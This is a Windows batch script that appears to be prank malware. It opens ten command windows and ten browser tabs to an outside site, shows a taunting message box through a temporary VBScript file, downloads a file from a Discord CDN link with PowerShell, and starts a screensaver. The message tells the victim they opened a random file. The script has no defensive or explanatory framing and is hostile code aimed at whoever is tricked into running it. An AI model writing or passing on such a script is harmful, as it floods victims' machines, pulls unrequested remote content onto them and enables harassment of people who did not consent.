FOR /L %%A IN (1,1,10) DO (
    start cmd.exe
    start https://nano-ck.cf
)
SET msgboxTitle=Hey, I'm NANO
SET msgboxBody=You just had the proof that you can't trust anyone! Never open random files
SET tmpmsgbox=%temp%\~tmpmsgbox.vbs
IF EXIST "%tmpmsgbox%" DEL /F /Q "%tmpmsgbox%"
ECHO msgbox "%msgboxBody%",0,"%msgboxTitle%">"%tmpmsgbox%"
WSCRIPT "%tmpmsgbox%"
powershell.exe -Command "Invoke-WebRequest -OutFile ./READ-ME-IMPORTANT.txt https://cdn.discordapp.com/attachments/800052087136190467/829393545436725258/READ-ME.txt"
bubbles.scr /MAX
